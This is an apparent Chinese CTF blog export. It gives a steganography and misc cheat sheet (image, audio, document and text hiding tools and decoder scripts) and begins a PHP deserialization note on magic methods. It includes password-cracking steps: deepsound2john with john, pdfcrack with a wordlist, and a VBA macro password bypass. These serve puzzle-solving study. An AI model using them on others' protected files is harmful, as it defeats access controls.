import osimport cv2import numpy as npdef de_arnold(img, shuffle_time, a, b):    r, c, d = img.shape    dp = np.zeros(img.shape, np.uint8)    for s in range(shuffle_time):        for i in range(r):            for j in range(c):                x = ((a * b + 1) * i - b * j) % r                y = (-a * i + j) % c                dp[x, y, :] = img[i, j, :]        img = np.copy(dp)    return img# 参数设置a, b = ?,  ? # Arnold变换的参数max_attempts = ? # 爆破的最大尝试次数output_dir = &quot;decrypted_images&quot;  # 输出文件夹os.makedirs(output_dir, exist_ok=True)# 读取加密图片img_en = cv2.imread(&#x27;en_flag.png&#x27;)if img_en is None:    raise FileNotFoundError(&quot;加密图片未找到，请检查路径和文件名是否正确。&quot;)# 开始爆破for shuffle_time in range(1, max_attempts + 1):    img_decrypted = de_arnold(img_en, shuffle_time, a, b)    output_path = os.path.join(output_dir, f&quot;flag_&#123;shuffle_time&#125;.png&quot;)    cv2.imwrite(output_path, img_decrypted)    print(f&quot;解密图片已保存: &#123;output_path&#125;&quot;)print(f&quot;爆破完成，共生成 &#123;max_attempts&#125; 张解密图片，保存在文件夹: &#123;output_dir&#125;&quot;)

三个参数都不知道的爆破脚本
import matplotlib.pyplot as pltimport cv2import numpy as npdef arnold_decode(image, shuffle_times, a, b):    &quot;&quot;&quot; decode for rgb image that encoded by Arnold    Args:        image: rgb image encoded by Arnold        shuffle_times: how many times to shuffle    Returns:        decode image    &quot;&quot;&quot;    # 1:创建新图像    decode_image = np.zeros(shape=image.shape)    # 2：计算N    h, w = image.shape[0], image.shape[1]    N = h  # 或N=w    # 3：遍历像素坐标变换    for time in range(shuffle_times):        for ori_x in range(h):            for ori_y in range(w):                # 按照公式坐标变换                new_x = ((a * b + 1) * ori_x + (-b) * ori_y) % N                new_y = ((-a) * ori_x + ori_y) % N                decode_image[new_x, new_y, :] = image[ori_x, ori_y, :]        image = np.copy(decode_image)    return imagedef arnold_brute(image,shuffle_times_range,a_range,b_range):    for c in range(shuffle_times_range[0],shuffle_times_range[1]):        for a in range(a_range[0],a_range[1]):            for b in range(b_range[0],b_range[1]):                print(f&quot;[+] Trying shuffle_times=&#123;c&#125; a=&#123;a&#125; b=&#123;b&#125;&quot;)                decoded_img = arnold_decode(image,c,a,b)                output_filename = f&quot;flag_decodedc&#123;c&#125;_a&#123;a&#125;_b&#123;b&#125;.png&quot;                cv2.imwrite(output_filename, decoded_img, [int(cv2.IMWRITE_PNG_COMPRESSION), 0])if __name__ == &quot;__main__&quot;:    img = cv2.imread(&quot;cat.png&quot;)    arnold_brute(img, (1,8), (1,12), (1,12))

爆破工具
音频类0x01 MP3stego(需要passwd)针对.mp3文件隐写
.\Decode.exe -X -P [password] [stego_mp3]
会在当前目录下生成一个txt文件
0x02 steghide(可需要passwd)上面提到过的steghide，也能用于音频隐写
0x03 Audacity神器
1.摩斯密码

2.频谱图

3.反向音频
4.波形
0x04 minimodem分析wav文件
minimodem --rx -f encoded.wav 1200

--rx：rx或者r均可，为指定读取模式-f：读取文件1200：为bell202 bps对应参数
//baudmode参考&#123;any floating point value N&#125; : Bell202-style at N bps −−ascii1200 : Bell202 1200 bps −−ascii300 : Bell103 300 bps −−asciirtty : RTTY 45.45 bps −−baudot −−stopbits 1.5tdd : TTY/TDD 45.45 bps −−baudot −−stopbits 2.0same : SAME 520.83 bps −−startbits 0 −−stopbits 0 −−sync-byte 0xAB NOAA Specific Area Message Encoding (SAME) protocolcallerid : Bell202 1200 bps Caller-ID (MDMF or SDMF) protocoluic-train : UIC-751-3 600 bps train-to-ground message protocoluic-ground : UIC-751-3 600 bps ground-to-train message protocol

官方手册
0x05 DeepSound(需要passwd)windows软件

部分题目的密码需要用deepsound2john.py爆破
#!/usr/bin/env python3&#x27;&#x27;&#x27;deepsound2john extracts password hashes from audio files containing encrypteddata steganographically embedded by DeepSound (http://jpinsoft.net/deepsound/).This method is known to work with files created by DeepSound 2.0.Input files should be in .wav format. Hashes can be recovered from audio fileseven after conversion from other formats, e.g.,    ffmpeg -i input output.wavUsage:    python3 deepsound2john.py carrier.wav &gt; hashes.txt    john hashes.txtThis software is copyright (c) 2018 Ryan Govostes &lt;rgovostes@gmail.com&gt;, andit is hereby released to the general public under the following terms:Redistribution and use in source and binary forms, with or withoutmodification, are permitted.&#x27;&#x27;&#x27;import loggingimport osimport sysimport textwrapdef decode_data_low(buf):  return buf[::2]def decode_data_normal(buf):  out = bytearray()  for i in range(0, len(buf), 4):    out.append((buf[i] &amp; 15) &lt;&lt; 4 | (buf[i + 2] &amp; 15))  return outdef decode_data_high(buf):  out = bytearray()  for i in range(0, len(buf), 8):    out.append((buf[i] &amp; 3) &lt;&lt; 6     | (buf[i + 2] &amp; 3) &lt;&lt; 4 \             | (buf[i + 4] &amp; 3) &lt;&lt; 2 | (buf[i + 6] &amp; 3))  return outdef is_magic(buf):  # This is a more efficient way of testing for the `DSCF` magic header without  # decoding the whole buffer  return (buf[0] &amp; 15)  == (68 &gt;&gt; 4) and (buf[2]  &amp; 15) == (68 &amp; 15) \     and (buf[4] &amp; 15)  == (83 &gt;&gt; 4) and (buf[6]  &amp; 15) == (83 &amp; 15) \     and (buf[8] &amp; 15)  == (67 &gt;&gt; 4) and (buf[10] &amp; 15) == (67 &amp; 15) \     and (buf[12] &amp; 15) == (70 &gt;&gt; 4) and (buf[14] &amp; 15) == (70 &amp; 15)def is_wave(buf):  return buf[0:4] == b&#x27;RIFF&#x27; and buf[8:12] == b&#x27;WAVE&#x27;def process_deepsound_file(f):  bname = os.path.basename(f.name)  logger = logging.getLogger(bname)  # Check if it&#x27;s a .wav file  buf = f.read(12)  if not is_wave(buf):    global convert_warn    logger.error(&#x27;file not in .wav format&#x27;)    convert_warn = True    return  f.seek(0, os.SEEK_SET)  # Scan for the marker...  hdrsz = 104  hdr = None  while True:    off = f.tell()    buf = f.read(hdrsz)    if len(buf) &lt; hdrsz: break    if is_magic(buf):          hdr = decode_data_normal(buf)          logger.info(&#x27;found DeepSound header at offset %i&#x27;, off)          break    f.seek(-hdrsz + 1, os.SEEK_CUR)  if hdr is None:    logger.warn(&#x27;does not appear to be a DeepSound file&#x27;)    return  # Check some header fields  mode = hdr[4]  encrypted = hdr[5]  modes = &#123;2: &#x27;low&#x27;, 4: &#x27;normal&#x27;, 8: &#x27;high&#x27;&#125;  if mode in modes:    logger.info(&#x27;data is encoded in %s-quality mode&#x27;, modes[mode])  else:    logger.error(&#x27;unexpected data encoding mode %i&#x27;, modes[mode])    return  if encrypted == 0:    logger.warn(&#x27;file is not encrypted&#x27;)    return  elif encrypted != 1:    logger.error(&#x27;unexpected encryption flag %i&#x27;, encrypted)    return  sha1 = hdr[6:6+20]  print(&#x27;%s:$dynamic_1529$%s&#x27; % (bname, sha1.hex()))if __name__ == &#x27;__main__&#x27;:  import argparse  parser = argparse.ArgumentParser()  parser.add_argument(&#x27;--verbose&#x27;, &#x27;-v&#x27;, action=&#x27;store_true&#x27;)  parser.add_argument(&#x27;files&#x27;, nargs=&#x27;+&#x27;, metavar=&#x27;file&#x27;,    type=argparse.FileType(&#x27;rb&#x27;, bufsize=4096))  args = parser.parse_args()  if args.verbose:    logging.basicConfig(level=logging.INFO)  else:    logging.basicConfig(level=logging.WARN)  convert_warn = False  for f in args.files:    process_deepsound_file(f)  if convert_warn:    print(textwrap.dedent(&#x27;&#x27;&#x27;    ---------------------------------------------------------------    Some files were not in .wav format. Try converting them to .wav    and try again. You can use: ffmpeg -i input output.wav    ---------------------------------------------------------------    &#x27;&#x27;&#x27;.rstrip()), file=sys.stderr)

用法
python3 deepsound2john.py carrier.wav &gt; hashes.txtjohn hashes.txt

0x06 dtmf
双音多频信号（Dual-Tone Multi-Frequency, DTMF），电话系统中电话机与交换机之间的一种用户信令，最常用于发拨号时送被叫号码。双音多频的拨号键盘是4×4的矩阵，每一行代表一个高频，每一列代表一个低频。每按一个键就发送一个高频和低频的正弦信号组合，比如’1’相当于697和1209赫兹（Hz）。交换机可以解码这些频率组合并确定所对应的按键。（来自维基百科）


命令识别：
dtmf2num xxx.wav


0x07 SSTV慢扫描电视（Slow-scan television）是业余无线电爱好者的一种主要图片传输方法，慢扫描电视通过无线电传输和接收单色或彩色静态图片
可以通过Robot36app或者SSTV Decoder识别
sstv -d audio_file.wav -o result.png

0x08 openpuff(需要passwd)windows软件
需要三个8位密码解密

0x08 lyralyra文件特征

安装步骤：
# 安装 Bazel 5.3.2apt-get install pkg-config zip g++ zlib1g-dev unzipwget https://github.com/bazelbuild/bazel/releases/download/5.3.2/bazel-5.3.2-installer-linux-x86_64.shchmod 777 bazel-5.3.2-installer-linux-x86_64.sh./bazel-5.3.2-installer-linux-x86_64.sh

# 安装特定版本的clangapt install ninja-build git cmake clanggit clone https://github.com/llvm/llvm-project.gitcd llvm-projectgit checkout 96ef4f307df2mkdir build_clangcd build_clangcmake -G Ninja -DCMAKE_C_COMPILER=clang -DCMAKE_CXX_COMPILER=clang++ -DLLVM_ENABLE_PROJECTS=&quot;clang&quot; -DCMAKE_BUILD_TYPE=release ../llvmninjasudo $(which ninja) installsudo ldconfig

# 安装lyraapt install python3-numpygit cone https://github.com/google/lyracd lyra/sed -i &#x27;s/com_github_gflags_gflags/gflags/g&#x27; WORKSPACEbazel build -c opt lyra/cli_example:decoder_main


用法
bazel-bin/lyra/cli_example/decoder_main --encoded_path=flag.lyra --output_dir=./ --bitrate=3200
0x09 Silenteye(需要password)wav音频文件可能是silenteye隐写，可以拿silenteye用默认密码解密试试
当然如果已知密钥的话就用密钥去解密
文档类0x01 VBA宏密码破解将CMG=替换为CMG.，DPB=替换为DPB. ，GC=替换为GC.
alt+F11打开vba编辑器
0x02 字体隐藏在字体的效果中勾选隐藏选项即可隐藏字符(或者采用了白色字体)

0x03 图片隐藏把后缀改为zip解压，在media目录下可以看到文档的所有图片(不排除故意放在其他目录中)
0x04 pdf文件使用福昕编辑器等即可编辑，或者可以尝试转换成docx
1、直接binwalk或者foremost提取出隐藏文件
2、可能是wbStego4open隐写(需要password)
3、若PDF加密，可以尝试使用pdfcrack爆破一下密码（Ubuntu下可以直接 apt install）
pdfcrack -f enc.pdf -w rockyou.txt


0x05 wbstego4适用于pdf和txt隐写
0x06 密码爆破可以用passware kit等工具爆破

0x07 odttf转ttf当复制文档中的内容至notepad后与原内容不一样，多半是修改了字体
在线网站转换
python转换
import osodttf_name = &quot;./1F513ACE-F8AD-4F84-9264-C7B38E1D8CB7.odttf&quot;odttf_path = os.path.abspath(odttf_name)with open(odttf_path, &quot;rb&quot;) as f:    data = f.read()# 获取文件名file_name = os.path.splitext(odttf_path)[0].split(&quot;\\&quot;)[-1].replace(&quot;-&quot;, &quot;&quot;)# 获取keykey = []for i in range(len(file_name), 0, -2):    key.append(int(file_name[i-2:i], 16))with open(&quot;./font2.ttf&quot;, &quot;wb&quot;) as f:    for i in range(32):        f.write(bytes([data[i] ^ key[i % len(key)]]))    f.write(data[32:])

转换前先修改xxx.odttf文件名为对应的fontKey值(&#x2F;word&#x2F;fontTable.xml)

FontDrop或fontforge识别ttf即可
0x08 行距隐写word中可能有一段是1倍行距，可能又有一段是1.5倍行距
根据不同行距可以转成摩斯电码
其他0x01 零宽字符隐写零宽度字符隐写术（Zero-Width Space Steganography），将隐藏消息编码和解码为不可打印&#x2F;可读字符。
字符包括：零宽度空格（\u200b）零宽度非连接符（\u200c）零宽度连接符（\u200d）从左至右书写标记（\u200e）从右至左书写标记（\u200f）

在线解密工具https://www.mzy0.com/ctftools/zerowidth1/http://330k.github.io/misc_tools&#x2F;unicode_steganography.htmlhttps://offdev.net/demos/zwsp-steg-jshttps://yuanfux.github.io/zero-width-web/http://www.atoolbox.net/Tool.php?Id=829
python解密https://github.com/enodari/zwsp-steg-py
js解密
/** *  Zero-Width Unicode Character Steganography *  Copyright (c) 2015-2016 Kei Misawa *  This software is released under the MIT License. *  http://opensource.org/licenses/mit-license.php */(function(exports)&#123;  &#x27;use strict&#x27;;  var chars = [];  var radix = 0;  var codelengthText = 0;  var codelengthBinary = 0;  /**    Set characters of coded hidden text(zero width characters)    args: string of zero width characters    return: null   */  var setUseChars = function(newchars)&#123;    if(newchars.length &gt;= 2)&#123;      chars = newchars.split(&#x27;&#x27;);      radix = chars.length;      codelengthText = Math.ceil(Math.log(65536) / Math.log(radix));      codelengthBinary = Math.ceil(Math.log(256) / Math.log(radix));    &#125;    return null;  &#125;;  /**    Text Encoder    args:      text: original text to be embedded (String)      data: text to be hidden (String)    return: unicode stego text   */  var encodeText = function(text1, text2)&#123;    return combine_shuffle_string(text1, encode_to_zerowidth_characters_text(text2), codelengthText);  &#125;;  /**    Binary Encoder    args:      text: original text to be embedded (String)      data: data to be hidden (Uint8Array)    return: unicode stego text   */  var encodeBinary = function(text, data)&#123;    return combine_shuffle_string(text, encode_to_zerowidth_characters_binary(data), codelengthBinary);  &#125;;  /**    Text Decoder    args: unicode text with steganography (String)    return: JavaScript Object &#123;      originalText: original text (String),      hiddenText: hidden data (String)    &#125;   */  var decodeText = function(text)&#123;    var splitted = split_zerowidth_characters(text);    return &#123;      &#x27;originalText&#x27;: splitted.originalText,      &#x27;hiddenText&#x27;: decode_from_zero_width_characters_text(splitted.hiddenText, codelengthText)    &#125;;  &#125;;  /**    Binary Decoder    args: unicode text with steganography (String)    return: JavaScript Object &#123;      originalText: original text (String),      hiddenData: hidden data (Uint8Array)    &#125;   */  var decodeBinary = function(text)&#123;    var splitted = split_zerowidth_characters(text);    return &#123;      &#x27;originalText&#x27;: splitted.originalText,      &#x27;hiddenData&#x27;: decode_from_zero_width_characters_binary(splitted.hiddenText)    &#125;;  &#125;;  setUseChars(&#x27;\u200c\u200d\u202c\ufeff&#x27;);  exports.unicodeSteganographer = &#123;    encodeText: encodeText,    decodeText: decodeText,    encodeBinary: encodeBinary,    decodeBinary: decodeBinary,    setUseChars: setUseChars  &#125;;  /**    Internal Functions  */  var encode_to_zerowidth_characters_text = function(str1)&#123;    var result = new Array(str1.length);    var base = &#x27;&#x27;;    var i;    var c;    var d;    var r;    //var base = &#x27;0&#x27;.repeat(codelength); // IE not support this method    for(i = 0; i &lt; codelengthText; i++)&#123;      base += &#x27;0&#x27;;    &#125;    for(i = 0; i &lt; str1.length; i++)&#123;      c = str1.charCodeAt(i);      d = c.toString(radix);      result[i] = (base + d).substr(-codelengthText);    &#125;    r = result.join(&#x27;&#x27;);    for(i = 0; i &lt; radix; i++)&#123;      r = r.replace(new RegExp(i, &#x27;g&#x27;), chars[i]);    &#125;    return r;  &#125;;  var encode_to_zerowidth_characters_binary = function(u8ary)&#123;    var result = new Array(u8ary.length);    var base = &#x27;&#x27;;    var i;    var c;    var d;    var r;    for(i = 0; i &lt; codelengthBinary; i++)&#123;      base += &#x27;0&#x27;;    &#125;    for(i = 0; i &lt; u8ary.length; i++)&#123;      d = u8ary[i].toString(radix);      result[i] = (base + d).substr(-codelengthBinary);    &#125;    r = result.join(&#x27;&#x27;);    for(i = 0; i &lt; radix; i++)&#123;      r = r.replace(new RegExp(i, &#x27;g&#x27;), chars[i]);    &#125;    return r;  &#125;;  var combine_shuffle_string = function(str1, str2, codelength)&#123;    var result = [];    var c0 = str1.split(/([\u0000-\u002F\u003A-\u0040\u005b-\u0060\u007b-\u007f])|([\u0030-\u0039]+)|([\u0041-\u005a\u0061-\u007a]+)|([\u0080-\u00FF]+)|([\u0100-\u017F]+)|([\u0180-\u024F]+)|([\u0250-\u02AF]+)|([\u02B0-\u02FF]+)|([\u0300-\u036F]+)|([\u0370-\u03FF]+)|([\u0400-\u04FF]+)|([\u0500-\u052F]+)|([\u0530-\u058F]+)|([\u0590-\u05FF]+)|([\u0600-\u06FF]+)|([\u0700-\u074F]+)|([\u0750-\u077F]+)|([\u0780-\u07BF]+)|([\u07C0-\u07FF]+)|([\u0800-\u083F]+)|([\u0840-\u085F]+)|([\u08A0-\u08FF]+)|([\u0900-\u097F]+)|([\u0980-\u09FF]+)|([\u0A00-\u0A7F]+)|([\u0A80-\u0AFF]+)|([\u0B00-\u0B7F]+)|([\u0B80-\u0BFF]+)|([\u0C00-\u0C7F]+)|([\u0C80-\u0CFF]+)|([\u0D00-\u0D7F]+)|([\u0D80-\u0DFF]+)|([\u0E00-\u0E7F]+)|([\u0E80-\u0EFF]+)|([\u0F00-\u0FFF]+)|([\u1000-\u109F]+)|([\u10A0-\u10FF]+)|([\u1100-\u11FF]+)|([\u1200-\u137F]+)|([\u1380-\u139F]+)|([\u13A0-\u13FF]+)|([\u1400-\u167F]+)|([\u1680-\u169F]+)|([\u16A0-\u16FF]+)|([\u1700-\u171F]+)|([\u1720-\u173F]+)|([\u1740-\u175F]+)|([\u1760-\u177F]+)|([\u1780-\u17FF]+)|([\u1800-\u18AF]+)|([\u18B0-\u18FF]+)|([\u1900-\u194F]+)|([\u1950-\u197F]+)|([\u1980-\u19DF]+)|([\u19E0-\u19FF]+)|([\u1A00-\u1A1F]+)|([\u1A20-\u1AAF]+)|([\u1AB0-\u1AFF]+)|([\u1B00-\u1B7F]+)|([\u1B80-\u1BBF]+)|([\u1BC0-\u1BFF]+)|([\u1C00-\u1C4F]+)|([\u1C50-\u1C7F]+)|([\u1CC0-\u1CCF]+)|([\u1CD0-\u1CFF]+)|([\u1D00-\u1D7F]+)|([\u1D80-\u1DBF]+)|([\u1DC0-\u1DFF]+)|([\u1E00-\u1EFF]+)|([\u1F00-\u1FFF]+)|([\u2000-\u206F]+)|([\u2070-\u209F]+)|([\u20A0-\u20CF]+)|([\u20D0-\u20FF]+)|([\u2100-\u214F]+)|([\u2150-\u218F]+)|([\u2190-\u21FF]+)|([\u2200-\u22FF]+)|([\u2300-\u23FF]+)|([\u2400-\u243F]+)|([\u2440-\u245F]+)|([\u2460-\u24FF]+)|([\u2500-\u257F]+)|([\u2580-\u259F]+)|([\u25A0-\u25FF]+)|([\u2600-\u26FF]+)|([\u2700-\u27BF]+)|([\u27C0-\u27EF]+)|([\u27F0-\u27FF]+)|([\u2800-\u28FF]+)|([\u2900-\u297F]+)|([\u2980-\u29FF]+)|([\u2A00-\u2AFF]+)|([\u2B00-\u2BFF]+)|([\u2C00-\u2C5F]+)|([\u2C60-\u2C7F]+)|([\u2C80-\u2CFF]+)|([\u2D00-\u2D2F]+)|([\u2D30-\u2D7F]+)|([\u2D80-\u2DDF]+)|([\u2DE0-\u2DFF]+)|([\u2E00-\u2E7F]+)|([\u2E80-\u2EFF]+)|([\u2F00-\u2FDF]+)|([\u2FF0-\u2FFF]+)|([\u3000-\u303F]+)|([\u3040-\u309F]+)|([\u30A0-\u30FF]+)|([\u3100-\u312F]+)|([\u3130-\u318F]+)|([\u3190-\u319F]+)|([\u31A0-\u31BF]+)|([\u31C0-\u31EF]+)|([\u31F0-\u31FF]+)|([\u3200-\u32FF]+)|([\u3300-\u33FF]+)|([\u3400-\u4DBF]+)|([\u4DC0-\u4DFF]+)|([\u4E00-\u9FFF]+)|([\uA000-\uA48F]+)|([\uA490-\uA4CF]+)|([\uA4D0-\uA4FF]+)|([\uA500-\uA63F]+)|([\uA640-\uA69F]+)|([\uA6A0-\uA6FF]+)|([\uA700-\uA71F]+)|([\uA720-\uA7FF]+)|([\uA800-\uA82F]+)|([\uA830-\uA83F]+)|([\uA840-\uA87F]+)|([\uA880-\uA8DF]+)|([\uA8E0-\uA8FF]+)|([\uA900-\uA92F]+)|([\uA930-\uA95F]+)|([\uA960-\uA97F]+)|([\uA980-\uA9DF]+)|([\uA9E0-\uA9FF]+)|([\uAA00-\uAA5F]+)|([\uAA60-\uAA7F]+)|([\uAA80-\uAADF]+)|([\uAAE0-\uAAFF]+)|([\uAB00-\uAB2F]+)|([\uAB30-\uAB6F]+)|([\uAB70-\uABBF]+)|([\uABC0-\uABFF]+)|([\uAC00-\uD7AF]+)|([\uD7B0-\uD7FF]+)|([\uD800-\uDFFF]+)|([\uE000-\uF8FF]+)|([\uF900-\uFAFF]+)|([\uFB00-\uFB4F]+)|([\uFB50-\uFDFF]+)|([\uFE00-\uFE0F]+)|([\uFE10-\uFE1F]+)|([\uFE20-\uFE2F]+)|([\uFE30-\uFE4F]+)|([\uFE50-\uFE6F]+)|([\uFE70-\uFEFF]+)|([\uFF00-\uFFEF]+)|([\uFFF0-\uFFFF]+)/g);    var c1 = [];    var i;    var j;    for(i = 0; i &lt; c0.length; i++)&#123;      if((typeof c0[i] !== &#x27;undefined&#x27;) &amp;&amp; (c0[i] !== &#x27;&#x27;))&#123;        c1.push(c0[i]);      &#125;    &#125;    var c2 = str2.split(new RegExp(&#x27;(.&#123;&#x27; + codelength + &#x27;&#125;)&#x27;, &#x27;g&#x27;));    var ratio = c1.length / (c1.length + c2.length);    /* slow    while((c1.length &gt; 0) &amp;&amp; (c2.length &gt; 0))&#123;      if(Math.random() &lt;= ratio)&#123;        result.push(c1.shift());      &#125;else&#123;        result.push(c2.shift());      &#125;    &#125;*/    i = 0;    j = 0;    while((i &lt; c1.length) &amp;&amp; (j &lt; c2.length))&#123;      if(Math.random() &lt;= ratio)&#123;        result.push(c1[i]);        i++;      &#125;else&#123;        result.push(c2[j]);        j++;      &#125;    &#125;    c1 = c1.slice(i);    c2 = c2.slice(j);    result = result.concat(c1).concat(c2);    return result.join(&#x27;&#x27;);  &#125;;  var split_zerowidth_characters = function(str1)&#123;    var result = &#123;&#125;;    result.originalText = str1.replace(new RegExp(&#x27;[&#x27; + chars.join(&#x27;&#x27;) + &#x27;]&#x27;, &#x27;g&#x27;), &#x27;&#x27;);    result.hiddenText = str1.replace(new RegExp(&#x27;[^&#x27; + chars.join(&#x27;&#x27;) + &#x27;]&#x27;, &#x27;g&#x27;), &#x27;&#x27;);    return result;  &#125;;  var decode_from_zero_width_characters_text = function(str1)&#123;    var r = str1;    var i;    var result = [];    for(i = 0; i &lt; radix; i++)&#123;      r = r.replace(new RegExp(chars[i], &#x27;g&#x27;), i);    &#125;    for(i = 0; i &lt; r.length; i += codelengthText)&#123;      result.push(String.fromCharCode(parseInt(r.substr(i, codelengthText), radix)));    &#125;    return result.join(&#x27;&#x27;);  &#125;;  var decode_from_zero_width_characters_binary = function(str1)&#123;    var r = str1;    var i;    var j;    var result = new Uint8Array(Math.ceil(str1.length / codelengthBinary));    for(i = 0; i &lt; radix; i++)&#123;      r = r.replace(new RegExp(chars[i], &#x27;g&#x27;), i);    &#125;    for(i = 0, j = 0; i &lt; r.length; i += codelengthBinary, j++)&#123;      result[j] = parseInt(r.substr(i, codelengthBinary), radix);    &#125;    return result;  &#125;;  return null;&#125;)(this);var s = unicodeSteganographers.setUseChars(&#x27;\u200b\u200c\u200d\u200e\u200f&#x27;);s.decodeText(&quot;我已经看见了，​​​​‎‏​​​​​‏​‍​​​​‏‍‌​​​​‏‍‏​​​​‎‏​​​​​‏‏‌​​​​‏‍‌​​​​‏‎‍​​​​‌‌‎​​​​‎‏‏​​​​‏‍‌​​​​‏‍​​​​​‏​‎​​​​‏‍‏​​​​‎‏‍​​​​‏‎‌​​​​‏‎‍​​​​‏‌‎​​​​‎‏‍​​​​‏‎‌​​​​‏​‌​​​‌​​​你呢？&quot;)/*** 复制并使用代码请注明引用出处哦~* Lazzaro @ https://lazzzaro.github.io*/

0x02 ntfs数据流隐写
NTFS交换数据流（alternate data streams，简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中。它使用资源派生来维持与文件相关的信息。————百度百科

创建一个NTFS数据流
echo &quot;test&quot; &gt; 1.txt:2.txt
查看数据流使用NtfsStreamsEditor(windows)工具或者notepad命令

0x03 pyc文件反编译一般使用uncompyle6
uncompyle6 test.pyc &gt; test.py
0x04 pyc隐写Stegosaurus 是一款隐写工具，它允许我们在 Python 字节码文件( pyc 或 pyo )中嵌入任意 Payload
github项目说是Python 3.6 or later，但是实际使用发现只有Python3.6可以运行
python3 stegosaurus.py -x [pyc_file]

有时候需要注意magic number的问题python3.6以下magic number是12个字节；python3.7以上是16个字节
0x05 Tupper自我指涉公式塔珀自指公式是杰夫·塔珀（Jeff Tupper）发现的自指公式：此公式的二维图像与公式本身外观一样。该公式是一种对存储在常量k 中的位图信息进行解码的通用方法 ，它实际上可以用来绘制任何其他图像。
该不等式的定义为：

其中 ⌊ ⌋ 表示楼层函数， mod 是模运算
根据k值不同，可以做出”任意”图像
Tupper’s Formula Tools
from functools import reducedef Tuppers_Self_Referential_Formula():    k = 4858450636189713423582095962494202044581400587983244549483093085061934704708809928450644769865524364849997247024915119110411605739177407856919754326571855442057210445735883681829823754139634338225199452191651284348332905131193199953502413758765239264874613394906870130562295813219481113685339535565290850023875092856892694555974281546386510730049106723058933586052544096664351265349363643957125565695936815184334857605266940161251266951421550539554519153785457525756590740540157929001765967965480064427829131488548259914721248506352686630476300    # 这里替换为你自己的K值    def f(x, y):        d = ((-17 * x) - (y % 17))        e = reduce(lambda x, y: x * y, [2 for x in range(-d)]) if d else 1        g = ((y // 17) // e) % 2        return 0.5 &lt; g    for y in range(k + 16, k - 1, -1):        line = &quot;&quot;        for x in range(0, 107):            if f(x, y):                line += &quot; ■&quot;            else:                line += &quot;  &quot;        print(line)if __name__ == &#x27;__main__&#x27;:    Tuppers_Self_Referential_Formula()

题目通常会给一个0-9组成的十进制长整数

曾遇到一道题目给出的提示：数字映射函数。就是使用Tupper自我指涉公式画图

0x06 snow隐写snow 隐写是在html嵌入隐写信息，它的原理是通过在文本文件的末尾嵌入空格和制表位的方式嵌入隐藏信息，不同空格与制表位的组合代表不同的嵌入信息。
snow加密的特征非常明显，它会生成大量的20，09，在预览的时候像雪花一样

snow在线
snow.exe -C -p password filename

0x07 whitespacewhite_space是一种编程语言由”空格”，”回车”，”tab”组成
whitespace ide
0x08 PGP
PGP 加密系统是采用公开密钥加密与传统密钥加密相结合的一种加密技术。它使用一对数学上相关的钥匙，其中一个（公钥）用来加密信息，另一个（私钥）用来解密信息。

一般需要私钥文件xxx.key或xxx.asc，加密文件xxx.pgp和一个密码
PGPTool: https://pgptool.github.io/
例如[BSidesSF2019]bWF0cnlvc2hrYQ&#x3D;&#x3D;
Key ring-&gt;Import PGP Key-&gt;导入xxx.key-&gt;然后输入密码

0x09 otp有点偏向密码学，wiki
一次性密码（One Time Password，简称 OTP），又称 “一次性口令”，是指只能使用一次的密码。
OTP 的密钥是以 base32 的方式存储的
python中有一个pyotp库可以处理它
#Time-based OTPsimport pyotpimport timetotp = pyotp.TOTP(&#x27;base32secret3232&#x27;)totp.now() # =&gt; &#x27;492039&#x27;totp.verify(&#x27;492039&#x27;) # =&gt; Truetime.sleep(30)totp.verify(&#x27;492039&#x27;) # =&gt; False#Counter-based OTPsimport pyotphotp = pyotp.HOTP(&#x27;base32secret3232&#x27;)hotp.at(0) # =&gt; &#x27;260182&#x27;hotp.at(1) # =&gt; &#x27;055283&#x27;hotp.at(1401) # =&gt; &#x27;316439&#x27;hotp.verify(&#x27;316439&#x27;, 1401) # =&gt; Truehotp.verify(&#x27;316439&#x27;, 1402) # =&gt; False#Generating a Secret Keypyotp.random_base32()pyotp.random_hex()

0x10 数控打印遇到*.gcode文件或者3D打印gcode的命令可以放到下面这两个网站解析
ncviewergCodeViewer

0x11 Dicom图像x光图像
后缀为.dcm的文件可以使用MicroDicom打开
0x12 垃圾邮件(spammimic)例如 2023NKCTF-first spam of rabbit year
特点是一份看上去没什么意义的邮件
在线解密
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>总结</tag>
        <tag>隐写</tag>
      </tags>
  </entry>
  <entry>
    <title>php反序列化总结</title>
    <url>/posts/dad17cf6/</url>
    <content><![CDATA[常见的魔术方法__construct()： 在创建对象时候初始化对象，一般用于对变量赋初值。__destruct()： 和构造函数相反，当对象所在函数调用完毕后执行。__call()： 当调用对象中不存在的方法会自动调用该方法。__get()： 获取对象不存在的属性时执行此函数。__set()： 设置对象不存在的属性时执行此函数。__toString()： 当对象被当做一个字符串使用时调用。__sleep()： 序列化对象之前就调用此方法(其返回需要一个数组)__wakeup()： 反序列化恢复对象之前调用该方法__isset()： 在不可访问的属性上调用isset()或empty()触发__unset()： 在不可访问的属性上使用unset()时触发__invoke()： 将对象当作函数来使用时执行此方法

__construct &amp; __destruct__construct：在实例化一个对象时，会被自动调用，可以作为非public权限属性的初始化__destruct：和构造函数相反，当对象销毁时会调用此方法，一是用户主动销毁对象，二是当程序结束时由引擎自动销毁
例子：
&lt;?phpclass test&#123;	public $username;	public $password;	function __construct($username,$password)&#123;		echo &quot;__construct\n&quot;;        $this-&gt;username = $username;        $this-&gt;password = $password;	&#125;	function __destruct()&#123;		echo &quot;__destruct\n&quot;;	&#125;&#125;$a = new test(&#x27;admin&#x27;,&#x27;admin888&#x27;);unset($a);echo &quot;abc\n&quot;;echo &quot;--------------------\n&quot;;$a = new test(&#x27;admin&#x27;,&#x27;admin888&#x27;);echo &quot;abc\n&quot;;

运行结果
__construct__destructabc--------------------__constructabc__destruct

__sleep &amp; __wakeup__sleep：序列化时自动调用__wakeup：反序列化时自动调用

如果类中同时定义了 __unserialize()和__wakeup() 两个魔术方法，则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。


同理，如果类中同时定义了 __serialize()和 __sleep() 两个魔术方法，则只有 __serialize() 方法会被调用。 __sleep() 方法会被忽略掉。

